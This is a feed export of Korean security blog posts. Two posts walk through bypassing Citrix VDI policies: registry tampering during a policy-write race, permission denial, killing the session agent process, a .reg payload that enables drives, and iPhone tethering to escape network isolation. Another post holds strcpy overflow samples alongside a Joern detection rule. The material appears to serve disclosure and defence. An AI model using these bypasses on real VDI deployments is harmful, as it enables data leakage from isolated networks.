보안 정책 효과성 검토 1. 서론 시트릭스 관리자들은 Citrix 그룹 정책을 통해 각 사용자의 VDI(가상 데스크탑 인프라)에 보안 정책을 적용합니다. 그러나 Citrix CSE(시트릭스 서비스 엔진)와 Citrix VDI 에이전트 내의 일부 구조적 취약점으로 인해 이러한 보안 정책을 우회할 가능성이 존재합니다.\n2. 보안 정책 우회 레지스트리 조작을 통한 우회 Citrix VDI 에이전트(PicaSvc2.exe)가 정책을 저장하는 과정에서 발생하는 레이스 컨디션을 이용해 레지스트리를 조작함으로써 보안 정책 우회가 가능합니다. 시트릭스는 이 취약점을 완화하기 위해 스텔스 패치를 적용했지만, 레지스트리 보안 설정을 조정하고 쓰기 권한을 거부함으로써 여전히 보안 정책을 비활성화할 수 있습니다.\nCSE의 강제 종료 시트릭스 CSE(시트릭스 서비스 엔진)가 강제로 종료되거나 삭제되면 보안 정책이 적용되지 않아, 제한된 리소스에 대한 무단 접근이 발생할 가능성이 있습니다.\nGPF 파일 조작 GPF(그룹 정책 파일)를 수정하거나 그 권한을 제한하여 보안 정책을 우회하려는 시도도 가능하지만, 이 방법은 불안정하며 여러 한계점이 존재합니다.\n3. 레지스트리 수정 및 쓰기 권한 거부를 통한 우회 사용자가 일반 계정(예: User A)으로 로그인하면, Citrix 보안 정책 설정은 Windows 세션 ID를 기반으로 레지스트리에 생성됩니다. 시트릭스가 보안보다 사용성을 우선시하는 경향으로 인해, 레지스트리 설정(CdmPolicies, IO, VCPolicies)을 수정하고 모든 사용자에 대해 쓰기 권한을 거부함으로써 보안 정책 우회가 가능해집니다. 이로 인해 재접속 시 보안 정책 우회가 이루어집니다.\n테스트 환경에서는 Citrix 보안 정책 레지스트리 설정이 변경되고 권한이 제한되면 자동 로그아웃이 발생합니다. ICA 파일 내의 ClearPassword, Domain, LogonTicket 등의 값을 임의의 값(예: “test”)으로 수정하면, 로컬 계정이 이 자동 로그아웃을 우회할 수 있습니다.\n또한, 로컬 보조 계정으로 로그인하면 강제 로그아웃 제한을 우회할 수 있습니다. 비록 시트릭스가 다중 로그인 세션을 제한하지만, Ctrl-Alt-Del을 눌러 작업 관리자를 실행하고 PicaSessionAgent.exe 프로세스를 종료함으로써 로그인을 완료할 수 있습니다.\n마지막으로, 로컬 계정(예: \u0026ldquo;windshock\u0026rdquo;)으로 로그인하면 Windows 세션 1에서 시트릭스 보안 정책이 우회되어 Citrix VDI를 사용할 수 있습니다.\n4. 결론 시트릭스의 보안 정책 적용 방식은 사용성을 우선시하는 것으로 보이며, 이는 사용자 접근성을 향상시킬 수 있지만 보안 정책 우회를 용이하게 하는 구조적 취약점을 초래합니다. 시트릭스를 사용하는 조직은 이러한 잠재적 보안 우회 가능성을 인식하고, 관리자들이 실시간으로 대응할 수 있도록 추가적인 내부 모니터링 또는 경보 시스템을 구현해야 합니다.\n더 나아가, 시트릭스가 Xen Hypervisor와 같은 하위 시스템 수준에서 보안 정책을 강제한다면, 보안과 사용성 사이의 균형을 유지하면서 우회 시도를 효과적으로 차단할 수 있을 것입니다. 이를 통해 조직은 요구되는 보안 수준과 시트릭스가 제공하는 접근성을 모두 달성할 수 있습니다.\nReferences Citrix Group Policy Troubleshooting for XenApp and XenDesktop 시트릭스 정책 우회는 취약점이 아니라 법률 위반이다 ","permalink":"https://windshock.github.io/ko/post/2024-11-05-review-of-citrix-security-policy-effectiveness/","summary":"\u003ch1 id=\"시트릭스-보안-정책-효과성-검토\"\u003e시트릭스 보안 정책 효과성 검토\u003c/h1\u003e\n\u003ch2 id=\"1-서론\"\u003e1. 서론\u003c/h2\u003e\n\u003cp\u003e시트릭스 관리자들은 Citrix 그룹 정책을 통해 각 사용자의 VDI(가상 데스크탑 인프라)에 보안 정책을 적용합니다. 그러나 Citrix CSE(시트릭스 서비스 엔진)와 Citrix VDI 에이전트 내의 일부 구조적 취약점으로 인해 이러한 보안 정책을 우회할 가능성이 존재합니다.\u003c/p\u003e\n\u003ch2 id=\"2-보안-정책-우회\"\u003e2. 보안 정책 우회\u003c/h2\u003e\n\u003ch3 id=\"레지스트리-조작을-통한-우회\"\u003e레지스트리 조작을 통한 우회\u003c/h3\u003e\n\u003cp\u003eCitrix VDI 에이전트(PicaSvc2.exe)가 정책을 저장하는 과정에서 발생하는 레이스 컨디션을 이용해 레지스트리를 조작함으로써 보안 정책 우회가 가능합니다. 시트릭스는 이 취약점을 완화하기 위해 스텔스 패치를 적용했지만, 레지스트리 보안 설정을 조정하고 쓰기 권한을 거부함으로써 여전히 보안 정책을 비활성화할 수 있습니다.\u003c/p\u003e","title":"시트릭스 보안 정책 효과성 검토"},{"content":"KPI가 사고를 일으킨다!!! - 잘못된 지표는 잘못된 결과를 낳는다. 오래전 메일을 뒤적이다가, 내가 너무 진지하게 보낸 메일에 대한 후배의 답변을 확인했다. 매니저님의 메일을 받고, 깊이 고민하지 않고 지시대로만 일을 수행하고 있음을 깨달았다. 어떤 업무 지시를 받든 해당 업무에 윤리적 이슈가 없는지, 그리고 그대로 수행하는 것이 맞는지 확실히 생각해보고 내 의지대로 진행해야겠다고 다짐했다.\n메일을 자세히 살펴보니, 그 후배는 취약점 현황 시스템을 관리하던 사람이었고, 팀장의 명령으로 고위험 취약점의 위험도를 일괄 낮추도록 조치한 뒤, 내가 윤리적 문제를 제기한 메일에 대해 답변한 것이었다. (오랜 시간이 지난 지금은 상황이 달라졌지만, 당시에는 참 착한 후배였다\u0026hellip;)\n몇 해 전, 임원평가를 앞둔 연말 즈음, 통제가 어려운 취약점 조치 KPI를 높이기 위해 팀장이 KPI 자체를 조작하려 한 적이 있었다. 그 직책자의 비윤리적 행위가 어떤 부작용을 낳았을지 궁금해졌다.\n과거 진단 업무와 사고 이력을 살펴보던 중, KPI가 실제로 보안 사고를 일으킨 사례를 확인하게 되었다. 보안과 관련된 사항이라 구체적인 내용을 밝히긴 어렵지만, “[단독] 해커에게 금융거래 인증문자 착신전환…비트코인 계좌 털려” 등의 뉴스 기사를 통해 간접적으로 접했던 기억이 있다. (착신전환 외에도 다양한 방법이 가능했다.)\n만약 KPI가 없었다면, 실무는 정상적으로 운영되어 사고가 발생하지 않았을 것이다. 그러나 현대 조직 구조에서 KPI는 빼놓을 수 없는 요소이다.\nKPI 구성이 잘못된 것일까? 평가자 입장에서 결과 중심(사고가 없든, 취약점이 없든)으로 지표를 설정할 수밖에 없었을 것이다.\nKPI를 관리하는 절차가 느슨했던 것일까? 아니면 타이트하게 수시로 피드백을 주며 평가에 반영했더라도 문제가 있었던 것일까? 당시 별도의 TF를 구성해 취약점 위험도에 대해 수시로 피드백을 진행했음에도 불구하고 말이다.\n결국, 시간이 지나면서 직책자 평가에 사용되는 KPI는 형식적이라는 사실을 깨달았다. 피터 드러커는 “측정할 수 없는 것은 관리할 수 없다”고 했는데, 사람이 만든 조직에서 기계적인 평가는 처음부터 맞지 않으며, 결국 사람의 욕심에 의해 조작될 수밖에 없다. 과연 우리는 조직을 효과적으로 관리할 수 있을까? 기업은 본질을 우선시할 수 있을까?\nWorks Cited “[단독] \u0026lsquo;해커에게 금융거래 인증문자 착신전환…비트코인 계좌 털려.\u0026rsquo;” 연합뉴스, 2017년 12월 3일, https://www.yna.co.kr/view/MYH20171203004600038. (접근일: 2024년 6월 16일)\n“잘못된 지표는 잘못된 결과를 낳는다.” 중앙일보, 2017년 3월 5일, https://www.joongang.co.kr/article/21337981#home.\n","permalink":"https://windshock.github.io/ko/post/2024-06-20-kpi-causes-accidents/","summary":"\u003ch2 id=\"kpi가-사고를-일으킨다---잘못된-지표는-잘못된-결과를-낳는다\"\u003eKPI가 사고를 일으킨다!!! - 잘못된 지표는 잘못된 결과를 낳는다.\u003c/h2\u003e\n\u003cp\u003e오래전 메일을 뒤적이다가, 내가 너무 진지하게 보낸 메일에 대한 후배의 답변을 확인했다. 매니저님의 메일을 받고, 깊이 고민하지 않고 지시대로만 일을 수행하고 있음을 깨달았다. 어떤 업무 지시를 받든 해당 업무에 윤리적 이슈가 없는지, 그리고 그대로 수행하는 것이 맞는지 확실히 생각해보고 내 의지대로 진행해야겠다고 다짐했다.\u003c/p\u003e\n\u003cp\u003e메일을 자세히 살펴보니, 그 후배는 취약점 현황 시스템을 관리하던 사람이었고, 팀장의 명령으로 고위험 취약점의 위험도를 일괄 낮추도록 조치한 뒤, 내가 윤리적 문제를 제기한 메일에 대해 답변한 것이었다. (오랜 시간이 지난 지금은 상황이 달라졌지만, 당시에는 참 착한 후배였다\u0026hellip;)\u003c/p\u003e","title":"KPI가 사고를 일으킨다!!!"},{"content":"보안진단 담당자의 흔한 착각 비효율적인 취약점 평가 구조와 대응 방법 서론 사이버 보안 환경이 끊임없이 변화하면서 보안 취약점 평가는 잠재적인 보안 침해에 대한 주요 방어수단으로 자리잡고 있습니다. 그러나 이에 대한 일반적인 오해로 인해 평가의 실효성이 저하되는 경우가 많습니다. 본 글에서는 보안 취약점 평가에 대한 잘못된 인식을 살펴보고, 이를 극복할 수 있는 효과적인 전략을 제시함으로써 조직의 보안 수준 향상을 지원하고자 합니다.\n보안 취약점 평가에 대한 잘못된 인식 1. 모든 취약점을 반드시 찾아내야 한다는 믿음 보안 취약점 평가 담당자들 사이에는 모든 취약점을 반드시 찾아내야 한다는 생각이 팽배합니다. 이는 인간 평가자의 한계를 이해하지 못한 것입니다. Tyma 등(2019)[1]의 연구에 따르면, 광범위한 노력에도 불구하고 일부 취약점만이 발견되었다고 합니다. 또한 회사의 승인 없이 취약점을 분석한 외부인에 대해 배타적인 자세를 보이는 경우도 있습니다. 이러한 인식의 한계는 평가 담당자들에게 좌절감과 불만을 야기할 수 있습니다.\n2. 보안 점검자의 능력에 대한 과장된 인식 보안 점검 담당자들은 모든 취약점을 반드시 찾아내야 한다고 착각하며, 자신이 발견하지 못한 취약점이 보고되면 화를 내는 경향이 있습니다. 이를 극복하려면 보안 점검자의 능력 한계를 인정하고, 외부 리소스(외부 전문가, 버그바운티 등)[2]를 활용해 취약점을 체계적으로 관리하는 노력이 필요합니다.\n3. 취약점에 대한 상세한 설명으로 문제가 해결될 것이라는 착각 많은 이들은 개발자에게 취약점에 대한 상세한 정보를 제공하면 보안 문제가 완전히 해결될 것이라고 생각합니다. 그러나 OWASP Top 10[3]에서 볼 수 있듯이, 상세한 이해에도 불구하고 기본적인 보안 문제는 지속적으로 발생합니다. 이는 근본적인 구조적 문제로, 취약점 정보만으로는 이를 해결하기 어렵습니다.\n실효성 있는 취약점 평가를 위한 전략 1. 통합적인 보안 설계 접근 개발자의 업무와 이해관계자의 요구사항을 이해하고, 이를 반영하여 구체적인 보안 설계 사양을 수립해야 합니다[2]. 단순히 취약점을 찾는 것이 아닌, 포괄적인 보안 설계 접근이 필요합니다.\n2. 체계적인 취약점 관리 프로세스 마련 취약점 발견 프로세스를 체계화하고, 버그 바운티, 침투 테스트 등 외부 자원을 활용해 취약점 발견 범위를 확대하며, 평가의 일관성과 효율성을 높일 수 있습니다(Shostack, 2014)[4].\n3. 보안 보고 기술 향상 취약점을 실증하지 않고도 효과적으로 보고할 수 있는 기술을 익힘으로써 평가의 효율성과 정확성을 높일 수 있습니다. CVSS(Common Vulnerability Scoring System) 등의 표준화된 도구를 활용하는 것도 도움이 됩니다(Ferrante \u0026amp; Canali, 2012)[5].\n결론 보안 취약점 평가는 강력한 사이버 보안 전략의 핵심 요소입니다. 일반적인 오해를 해소하고 체계적이며 통합적인 접근법을 구현함으로써 조직은 보안 수준을 높이고 잠재적인 위협의 위험을 줄일 수 있습니다. 인간 평가자의 한계를 인정하고, 보안 설계 중심의 접근, 체계적인 취약점 관리, 보고 기술 향상을 통해 끊임없이 변화하는 사이버 위협에 효과적으로 대응할 수 있을 것입니다.\n[1] Tyma, G. et al. (2019). \u0026ldquo;Limitations of Human Vulnerability Assessors: A Comparative Study.\u0026rdquo; Proceedings of the 34th Annual Computer Security Applications Conference.\n[2] Whitman, M. E., \u0026amp; Mattord, H. J. (2016). Principles of Information Security. Cengage Learning.\n[3] OWASP. (2021). \u0026ldquo;OWASP Top 10.\u0026rdquo; The Open Web Application Security Project.\n[4] Shostack, A. (2014). Threat Modeling: Designing for Security. Wiley.\n[5] Ferrante, A., \u0026amp; Canali, C. (2012). \u0026ldquo;A Systematic Approach to the Assessment of Security Vulnerabilities.\u0026rdquo; Journal of Information Security and Applications, 17(6), 318-329.\n","permalink":"https://windshock.github.io/ko/post/2024-06-16-common-misconceptions-of-security-assessors/","summary":"\u003ch1 id=\"보안진단-담당자의-흔한-착각\"\u003e보안진단 담당자의 흔한 착각\u003c/h1\u003e\n\u003ch2 id=\"비효율적인-취약점-평가-구조와-대응-방법\"\u003e비효율적인 취약점 평가 구조와 대응 방법\u003c/h2\u003e\n\u003ch1 id=\"서론\"\u003e서론\u003c/h1\u003e\n\u003cp\u003e사이버 보안 환경이 끊임없이 변화하면서 보안 취약점 평가는 잠재적인 보안 침해에 대한 주요 방어수단으로 자리잡고 있습니다. 그러나 이에 대한 일반적인 오해로 인해 평가의 실효성이 저하되는 경우가 많습니다. 본 글에서는 보안 취약점 평가에 대한 잘못된 인식을 살펴보고, 이를 극복할 수 있는 효과적인 전략을 제시함으로써 조직의 보안 수준 향상을 지원하고자 합니다.\u003c/p\u003e\n\u003ch1 id=\"보안-취약점-평가에-대한-잘못된-인식\"\u003e보안 취약점 평가에 대한 잘못된 인식\u003c/h1\u003e\n\u003ch2 id=\"1-모든-취약점을-반드시-찾아내야-한다는-믿음\"\u003e1. 모든 취약점을 반드시 찾아내야 한다는 믿음\u003c/h2\u003e\n\u003cp\u003e보안 취약점 평가 담당자들 사이에는 모든 취약점을 반드시 찾아내야 한다는 생각이 팽배합니다. 이는 인간 평가자의 한계를 이해하지 못한 것입니다. Tyma 등(2019)[1]의 연구에 따르면, 광범위한 노력에도 불구하고 일부 취약점만이 발견되었다고 합니다. 또한 회사의 승인 없이 취약점을 분석한 외부인에 대해 배타적인 자세를 보이는 경우도 있습니다. 이러한 인식의 한계는 평가 담당자들에게 좌절감과 불만을 야기할 수 있습니다.\u003c/p\u003e","title":"보안진단 담당자의 흔한 착각"},{"content":"개발문화가 보안수준에 영향을 미칠 수 있을까? 정적 분석 도구(joern)를 이용한 코드 품질과 보안 수준의 평가 배경 개방적이고 협업 중심의 개발문화를 가진 구글 등 회사와 달리, 그렇지 못한 일부 조직에서는 개인의 역량에 따라 코드의 품질 - 보안 수준을 포함하여 - 이 좌우될 수 있습니다. 특히, C 코드에서 strcpy 함수를 사용하는 등의 품질 낮은 코드를 작성하는 경향이 있는 개발자들에게 정적 분석 도구(joern, codeQL 등)을 커스텀 룰을 활용하여 코드의 품질과 보안 수준을 평가하여 제공할 수 있습니다. 결과적으로 개발 문화가 부족한 제한된 상황에서도 코드 품질과 동시에 보안수준이 향상되는, Good한 수준의 코드를 기대할 수 있습니다.\n구글의 개발문화 구글에서는 Google C++ Style Guide를 활용하여 C++ 코드를 작성하고 관리하는데, 이를 회사 조직 차원에서 적용하는 방법은 다음과 같습니다:\n조직 문화: 구글은 개방적이고 협업 중심의 조직 문화를 가지고 있습니다. 이러한 문화는 개발자들이 서로 협력하고, 지식을 공유하며, 서로의 코드를 검토하고 피드백을 주는 환경을 조성합니다2. 이는 코딩 스타일 가이드를 준수하고, 코드의 품질을 높이는 데 도움이 됩니다2. 교육 및 훈련: 구글은 새로운 개발자들에게 코딩 스타일 가이드를 준수하는 방법을 교육하고, 이를 실제 작업에 적용하는 방법을 훈련합니다. 이는 개발자들이 코딩 스타일 가이드를 이해하고, 이를 자신의 작업에 적용하는 데 도움이 됩니다. 도구 및 자원 제공: 구글은 개발자들에게 코딩 스타일 가이드를 준수하는 데 필요한 도구와 자원을 제공합니다1. 예를 들어, cpplint와 같은 lint 툴을 제공하여 코드 스타일 가이드를 준수하는지 자동으로 검사할 수 있습니다. 이러한 방식을 통해 구글은 조직 차원에서 코딩 스타일 가이드를 적용하고, 이를 통해 코드의 일관성을 유지하고, 코드의 품질을 높이는 데 도움이 됩니다. 이 외에도 Google Style Guide에는 다양한 코딩 표준과 규칙이 포함되어 있으며, C++ 표준 위원회 C++ Core Guidelines 자료도 있으니 참고하세요.\n개발문화가 없는 조직 대조적으로 일부 조직에는 강력한 개발 문화가 협업과 코딩 표준 준수를 장려하는 응집력 있는 문화가 부족합니다. 이는 개발을 자주 아웃소싱하고 아웃소싱 파트너가 자주 변경되는 기업의 경우 특히 그렇습니다. 이러한 시나리오에서는 일관되지 않은 관행, 개발자 간의 기술 수준 차이, 응집력 있는 표준 부족으로 인해 보안 수준을 포함한 코드 품질이 저하될 수 있습니다. 결과적으로 이러한 조직은 보안 취약성 및 차선의 코드 품질로 인한 위험이 높아집니다.\nstrcpy 함수의 위험성 strcpy 함수는 문자열을 복사하는 함수입니다. 그러나 이 함수의 주요 문제점은 메모리의 경계를 검사하지 않는다는 것입니다. 즉, 복사될 메모리의 크기보다 원본 문자열의 크기가 더 크면 버퍼 오버플로우 버그가 발생할 수 있습니다. 이는 프로그램 실행 시에 오류를 발생시키거나 프로그램이 오작동할 수 있습니다.\n이러한 문제를 해결하기 위해 C11 표준에서는 strcpy_s 함수를 제공합니다. strcpy_s 함수는 strcpy 함수의 단점을 보완하기 위해 만들어진 함수로, 이 함수를 사용할 때는 복사될 메모리의 크기를 두 번째 인자에 꼭 적어주어야 합니다. 이렇게 하면 버퍼 오버플로우 문제를 방지할 수 있습니다.\n정적 분석 도구 Joern을 사용하면 포괄적인 CPG(코드 속성 그래프)가 구문, 제어 흐름 및 데이터 흐름을 통합 구조로 통합하여 복잡한 보안 취약성과 코드 문제를 철저하게 감지할 수 있으므로 유리합니다. 또한 Joern의 사용자 정의 가능한 쿼리를 통해 특정 프로젝트 요구 사항에 맞는 정밀한 취약성 탐지가 가능하며 확장성 덕분에 대규모 코드베이스를 효율적으로 분석할 수 있습니다. 개발 라이프사이클의 다양한 단계를 자동화하고 통합하는 이 도구의 기능은 문제를 조기에 감지하여 전반적인 코드 품질을 향상시키는 데 도움이 됩니다. 또한 Joern은 여러 프로그래밍 언어를 지원하므로 다양한 개발 환경에 다용도로 사용할 수 있습니다.\n그러나 반드시 Joern을 사용할 필요는 없습니다. CodeQL 및 Checkmarx와 같은 유사한 도구도 강력한 정적 분석 기능을 제공합니다. 자세한 내용은 Joern 문서 및 그래프 데이터베이스 및 코드 분석 기법에 대한 관련 자료를 참조하세요.\n커스텀 룰 예시 구분 Good (보안수준: 양호, 코드품질 : 양호) Normal (보안수준 : 미흡 , 코드품질 : 낮음) Bad (보안수준 : 취약, 코드품질 : 낮음) 설명 입력 값의 유효성 검사는 항상 이루어져야 합니다. 입력 값의 크기를 항상 확인하거나 함수 자체에서 입력의 크기를 검사하는 함수 (strncpy, strlcpy, strcpy_s 등) 들로 대체하여 사용해야합니다. 입력 값의 크기를 확인하여 변수를 생성하고 있으나 위험한 함수를 사용하고 있습니다. 개발자가 데이터 타입에 대한 입력 값 크기를 착각 하는 예외적인 케이스에 취약할 수 있습니다. 입력의 크기를 확인하지 않고 버퍼 복사하는 것 (\u0026lsquo;전통적인 버퍼 오버플로우\u0026rsquo;) 버퍼 오버 플로우 취약점을 통해, 권한 상승, 의도되지 않은 명령 실행 등의 시스템에 심각한 위험을 초래할 수 있습니다. Case strlen_malloc_strncpy ZIP_EXTERN zip_int64_t zip_add_dir(struct zip *za, const char *name) { size_t MAXSIZE = 1024; char* sInput = (char*)malloc(MAXSIZE); memset(sInput, 0, MAXSIZE); \u0026hellip; \u0026hellip; const jbyte* javaStr; jint result = -1; javaStr = (*env)-\u0026gt;GetStringUTFChars(env, drmFileName, NULL); if(javaStr == NULL) goto end; strncpy(sInput, javaStr, MAXSIZE); \u0026hellip;\u0026hellip; \u0026hellip;\u0026hellip; } strlen_malloc_strcpy ZIP_EXTERN zip_int64_t zip_add_dir(struct zip *za, const char *name) { int len; char *s; \u0026hellip;\u0026hellip; s = NULL; len = strlen(name); if (name[len-1] != \u0026lsquo;/\u0026rsquo;) { if ((s=(char *)malloc(len+2)) == NULL) { _zip_error_set(\u0026amp;za-\u0026gt;error, ZIP_ER_MEMORY, 0); return -1; } strcpy(s, name); \u0026hellip;\u0026hellip; } malloc(정수)_strcpy Java_com_skt_skaf_OA00050017_engine_ComicEngineJNI_Open (JNIEnv* env, drmFileName, \u0026hellip;\u0026hellip;) { char* sInput = (char*)malloc(1024); \u0026hellip;\u0026hellip; const jbyte* javaStr; \u0026hellip;\u0026hellip; javaStr = (*env)-\u0026gt;GetStringUTFChars(env, drmFileName, ((void*)0)); \u0026hellip;\u0026hellip; strcpy(sInput, javaStr); \u0026hellip;\u0026hellip; } Source/ Sink Source : * Sink : strncpy, strlcpy, strcpy_s Source : * Sink : strcpy, strcat, sprintf, vsprintf, gets Source : GetStringUTFChars Sink : strcpy, strcat, sprintf, vsprintf, gets Pattern malloc의 param이 더하기 표현이며, 그 malloc의 data flow 상 선행으로 strlen, 후행으로 strcpy이다. malloc의 param이 더하기 표현이며, 그 malloc의 data flow 상 선행으로 strlen, 후행으로 strcpy이다. malloc의 param에 정수를 입력하고 data flow 상에서 strcpy를 사용한다. 길이 제한이 없는 알려진 함수(GetStringUTFChars 등)의 결과 값을 strcpy의 input 값으로 사용한다. Rule echo \u0026quot; \\ getCallsTo(\u0026lsquo;malloc\u0026rsquo;) \\ .ithArguments(\u0026lsquo;0\u0026rsquo;).children().has(\u0026rsquo;type\u0026rsquo;,\u0026lsquo;AdditiveExpression\u0026rsquo;).statements() \\ .or( \\ __.in(\u0026lsquo;REACHES\u0026rsquo;).has(\u0026lsquo;code\u0026rsquo;,new P(CONTAINS_REGEX,\u0026rsquo;.*strlen.*\u0026rsquo;)) \\ .out(\u0026lsquo;REACHES\u0026rsquo;).has(\u0026lsquo;code\u0026rsquo;, new P(CONTAINS_REGEX,\u0026rsquo;.*malloc.*\u0026rsquo;)), \\ __.has(\u0026lsquo;code\u0026rsquo;,new P(CONTAINS_REGEX,\u0026rsquo;.*strlen.*\u0026rsquo;)) \\ ).out(\u0026lsquo;REACHES\u0026rsquo;) \\ .has(\u0026lsquo;code\u0026rsquo;, new P(CONTAINS_REGEX,\u0026rsquo;.*strncpy.* .*strlcpys.* .*strcpy_s.*\u0026rsquo;)) \\ .id()\u0026quot; 참고 https://randomascii.wordpress.com/2013/04/03/stop-using-strncpy-already/ https://www.cse.psu.edu/~gxt29/papers/jdksecurity.pdf ","permalink":"https://windshock.github.io/ko/post/2024-05-22-can-development-culture-influence-security-levels/","summary":"\u003ch1 id=\"개발문화가-보안수준에-영향을-미칠-수-있을까\"\u003e개발문화가 보안수준에 영향을 미칠 수 있을까?\u003c/h1\u003e\n\u003cp\u003e\u003cimg alt=\"Development Culture\" loading=\"lazy\" src=\"/images/post/development-culture.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"정적-분석-도구joern를-이용한-코드-품질과-보안-수준의-평가\"\u003e정적 분석 도구(joern)를 이용한 코드 품질과 보안 수준의 평가\u003c/h2\u003e\n\u003ch1 id=\"배경\"\u003e배경\u003c/h1\u003e\n\u003cp\u003e\u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#%ea%b5%ac%ea%b8%80%ec%9d%98-%ea%b0%9c%eb%b0%9c%eb%ac%b8%ed%99%94\"\u003e개방적이고 협업 중심의 개발문화를 가진 구글\u003c/a\u003e 등 회사와 달리, \u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#%ea%b0%9c%eb%b0%9c%eb%ac%b8%ed%99%94%ea%b0%80-%ec%97%86%eb%8a%94-%ec%a1%b0%ec%a7%81\"\u003e그렇지 못한 일부 조직\u003c/a\u003e에서는 개인의 역량에 따라 코드의 품질 - 보안 수준을 포함하여 - 이 좌우될 수 있습니다. 특히, C 코드에서 \u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#strcpy-%ed%95%a8%ec%88%98%ec%9d%98-%ec%9c%84%ed%97%98%ec%84%b1\"\u003estrcpy 함수\u003c/a\u003e를 사용하는 등의 품질 낮은 코드를 작성하는 경향이 있는 개발자들에게 \u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#%ec%a0%95%ec%a0%81-%eb%b6%84%ec%84%9d-%eb%8f%84%ea%b5%ac\"\u003e정적 분석 도구\u003c/a\u003e(joern, codeQL 등)을 \u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#%ec%bb%a4%ec%8a%a4%ed%85%80-%eb%a3%b0-%ec%98%88%ec%8b%9c\"\u003e커스텀 룰\u003c/a\u003e을 활용하여 코드의 품질과 보안 수준을 평가하여 제공할 수 있습니다. 결과적으로 개발 문화가 부족한 제한된 상황에서도 코드 품질과 동시에 보안수준이 향상되는, Good한 수준의 코드를 기대할 수 있습니다.\u003c/p\u003e","title":"개발문화가 보안수준에 영향을 미칠 수 있을까?"},{"content":"시트릭스 정책 우회는 취약점이 아니라 법률 위반이다 주의!! cert.org의 VINCE를 통한 Citrix와의 논의를 바탕으로, 이 문제는 관리 권한이 필요하기 때문에 취약점으로 분류되지 않는 것으로 결론지어졌습니다. 따라서 보안상의 문제 없이 이 정보를 공유할 수 있습니다. 그러나 보안상의 이유로, 논리적으로 격리되거나 폐쇄된 네트워크와 같은 특수 환경에서는 Xendesktop (VDI)의 사용을 권장하지 않습니다. 만약 VDI를 반드시 사용해야 한다면, 관리자 권한을 제거하고 보안 전용 소프트웨어를 설치해야 합니다.\n관리자 권한이 필요하다는 점은 위험을 낮출 수 있지만, 잠재적인 영향력을 완전히 제거하지는 않습니다. 아래는 Citrix 정책이 어떻게 우회될 수 있는지에 대한 상세한 기술 설명입니다.\n설명 Citrix VDI 에이전트(PicaSvc2.exe)는 Citrix 관리 서버로부터 정책을 수신하고, 이를 레지스트리(HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Citrix\\1\\User)에 기록한 후, 레지스트리에서 읽어 정책을 적용하는 구조로 보입니다. 공격자는 아래의 개념 증명(POC)을 참고하여, 레지스트리 조작을 통해 Citrix 정책 서버가 강제하는 드라이브, 네트워크 접근, 클립보드 작업 등의 보안 정책을 우회할 수 있습니다.\nCitrix의 Common Criteria 인증 문서에 따르면, 이러한 구성 데이터(Configdata)가 공격자에 의해 변경되지 않도록 보호하는 메커니즘이 설계되어 있습니다. 이와 같은 우회는 구현상의 결함으로 간주될 수 있습니다.\n폐쇄되거나 격리된 네트워크 환경에서 VDI를 사용할 경우, Citrix 정책을 우회하여 VDI를 강제로 인터넷에 연결하게 되면 민감한 내부 정보가 외부로 유출될 위험이 있습니다. 특히 대한민국에서는 이러한 행위가 명백한 법 위반으로 간주되며, 네트워크 격리 대책에 대한 재검토가 필요합니다.\n개념 증명 (POC) 공격자는 우선 회사 계정에 접근한 후, 회사의 Citrix VDI(Windows 10 실행 중)에 로그인해야 합니다. VDI 환경은 일반적으로 네트워크 접근, 프린터 사용, 외부 드라이브 연결, 클립보드 접근 등이 제한되어 있습니다.\n공격자는 VDI에 로그인하여 레지스트리를 지속적으로 수정하는 배치 파일(다운로드 링크)을 실행한 후, VDI 세션에서 로그아웃합니다.\n배치 파일을 실행하여 레지스트리를 수정한 후, 공격자는 VDI에서 로그아웃합니다. 재로그인 시, 레지스트리 값이 변조되어 Citrix 정책을 우회할 수 있게 됩니다.\n예시 레지스트리 수정 내용:\nWindows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Citrix\\1\\User] \u0026#34;AutoConnectDrives\u0026#34;=dword:00000001 \u0026#34;AllowCdromDrives\u0026#34;=dword:00000001 \u0026#34;AllowFixedDrives\u0026#34;=dword:00000001 \u0026#34;AllowFloppyDrives\u0026#34;=dword:00000001 \u0026#34;AllowNetworkDrives\u0026#34;=dword:00000001 \u0026#34;AllowRemoveableDrives\u0026#34;=dword:00000001 \u0026#34;UseAsyncWrites\u0026#34;=dword:00000001 \u0026#34;ReadOnlyMappedDrive\u0026#34;=dword:00000000 VDI에 다시 로그인하면, PicaSvc2.exe가 Citrix 서버로부터 정책 설정을 가져와 레지스트리에 저장합니다.\nPicaSvc2.exe가 정책을 쓰고 읽는 동안, 이미 배치 파일에 의해 레지스트리 값이 조작되어 있습니다.\nPicaSvc2.exe는 조작된 정책을 VDI 환경에 적용합니다.\n추가 사항:\n연결 PC의 레지스트리를 수정함으로써 하드웨어 리디렉션이 활성화되어 무단 네트워크 접근이 가능해질 수 있습니다. Citrix의 기본 정책은 USB 클래스 FFh를 허용하므로, iPhone을 테더링 용도로 사용하거나 USB 기반 무선 카드를 통해 네트워크 격리를 우회할 수 있습니다. iPhone 테더링을 활성화하려면, 공격자는 iTunes 설치 프로그램에서 추출한 드라이버인 Apple 네트워크 드라이버와 Apple USB 드라이버를 설치해야 합니다. Citrix 세션에서 iPhone을 리디렉션하면, 네트워크 격리 환경에서도 인터넷 접근이 가능해집니다. 영향 VDI를 사용하여 논리적 네트워크 분리를 유지하는 기업의 경우, 이 취약점을 통해 내부 정보 유출 및 내부 서버에 대한 무단 접근이 발생할 수 있습니다.\n잠재적 영향을 고려할 때, 이러한 공격을 실시간으로 탐지하고 완화하는 것이 매우 중요합니다. 아래는 잠재적인 우회 활동을 발견하고 모니터링하는 단계입니다.\n탐지 이 문제를 탐지하기 위해:\nProcmon을 사용하여 PicaSvc2.exe의 동작을 모니터링합니다. Citrix 에이전트가 정책 설정을 저장하는 레지스트리 키를 조사합니다. 해당 레지스트리 값의 변경 효과를 조작하고 관찰합니다. 설계 분석 Citrix의 Common Criteria 인증 문서에는 구성 데이터의 무단 변경을 방지하기 위한 조치들이 포함되어 있습니다. Citrix의 Common Criteria 인증 정보에 따르면, 가상 데스크탑이나 애플리케이션의 설정과 할당에 필요한 데이터의 